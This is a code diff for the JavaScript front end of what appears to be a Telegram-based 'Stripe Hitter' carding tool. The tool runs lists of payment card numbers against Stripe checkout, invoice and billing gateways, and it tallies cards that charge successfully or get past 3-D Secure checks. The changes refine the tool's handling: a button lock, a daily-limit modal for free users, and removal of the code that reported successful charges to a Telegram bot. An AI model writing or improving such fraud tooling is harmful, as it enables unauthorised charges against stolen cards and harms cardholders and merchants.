@@ -381,9 +381,13 @@ hitBtn.addEventListener('click', async () => {
     // Start Process
     isHitting = true;
     hitBtn.classList.add('stop-btn');
+    hitBtn.disabled = true; // Physical lock
     hitBtnText.innerText = 'STOP';
     resultsList.innerHTML = '';
+    
+    // Reset Stats
     stats = { total: 0, charged: 0, bypassed: 0 };
+    chargedCards = []; // Important: Clear success list too
     updateStatsUI();
     successCard.classList.add('hidden');
 
@@ -393,8 +397,7 @@ hitBtn.addEventListener('click', async () => {
 
         // Check Limit Again (Real-time)
         if (userPlan === 'free' && remainingHits <= 0) {
-            alert('Daily limit reached! Please upgrade your plan.');
-            window.location.href = 'plans.html';
+            showLimitModal('Daily limit reached! Please upgrade your plan.');
             break;
         }
 
@@ -420,8 +423,7 @@ hitBtn.addEventListener('click', async () => {
 
             if (!response.ok) {
                 if (response.status === 403) {
-                    alert(result.message || 'Limit Reached');
-                    window.location.href = 'plans.html';
+                    showLimitModal(result.message || 'Limit Reached');
                     isHitting = false;
                     break;
                 }
@@ -435,7 +437,6 @@ hitBtn.addEventListener('click', async () => {
                 updateUIWithPlan();
             }
 
-            processHitResult(card, result, elapsed, i + 1, cards.length);
             processHitResult(card, result, elapsed, i + 1, cards.length);
 
             // STOP IMMEDIATELY if hit is successful
@@ -452,6 +453,7 @@ hitBtn.addEventListener('click', async () => {
 
     isHitting = false;
     hitBtn.classList.remove('stop-btn');
+    hitBtn.disabled = false; // Release lock
     hitBtnText.innerText = 'Start Hitting';
     if (tg && tg.HapticFeedback && stats.charged > 0) tg.HapticFeedback.notificationOccurred('success');
 });
@@ -466,7 +468,6 @@ function processHitResult(card, res, elapsed, count, total) {
         stats.charged++;
         chargedCards.push(card);
         showSuccessCard(card, res, count, total);
-        sendHitToTelegram(card, res);
         if (tg) tg.HapticFeedback.notificationOccurred('success');
     } else if (status === '3ds_bypassed' || status === 'live') {
         stats.bypassed++;
@@ -519,50 +520,17 @@ function injectLog(card, status, message, elapsed, bypassed3ds = false) {
     resultsList.prepend(div);
 }
 
-// Telegram Notification Logic
-async function sendHitToTelegram(card, res) {
-    const user = tg?.initDataUnsafe?.user;
-    const userName = user ? `${user.first_name}${user.last_name ? ' ' + user.last_name : ''}` : 'Unknown User';
-    
-    // Format Gateway Name based on activeGate
-    const gatewayMap = {
-        'checkout': 'Stripe Checkout Hitter',
-        'invoice': 'Stripe Invoice Hitter',
-        'billing': 'Stripe Billing Hitter'
-    };
-    const gateway = gatewayMap[activeGate] || 'Stripe Hitter';
-
-    const message = `
-🔥 <b>HIT DETECTED</b> ⚡
-👤 ${userName} [${userPlan.toUpperCase()}]
-↔️ <b>Gateway</b>: ${gateway}
-✅ <b>Response</b>: Charged Successfully
-🌐 <b>Site</b>: ${res.site || analyzedData.site || 'Unknown'}
-💰 <b>Amount</b>: ${res.amount || analyzedData.amount || 'Unknown'}
-`.trim();
-
-    try {
-        await fetch(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: NOTIFY_CHAT_ID,
-                text: message,
-                parse_mode: 'HTML',
-                disable_web_page_preview: true,
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: "Open HIT Checker", url: "https://t.me/autohittrobot" }
-                        ]
-                    ]
-                }
-            })
-        });
-    } catch (err) {
-        console.error('Failed to send telegram notification:', err);
+function showLimitModal(msg) {
+    const modal = document.getElementById('limitModal');
+    const msgEl = document.getElementById('limitModalMsg');
+    if (modal && msgEl) {
+        msgEl.innerText = msg || 'You have used your free hits for today.';
+        modal.classList.remove('hidden');
+    } else {
+        alert(msg || 'Limit Reached'); // Fallback if modal missing
     }
 }
+
 
 // Copy Charged
 document.getElementById('copyBtn').addEventListener('click', () => {
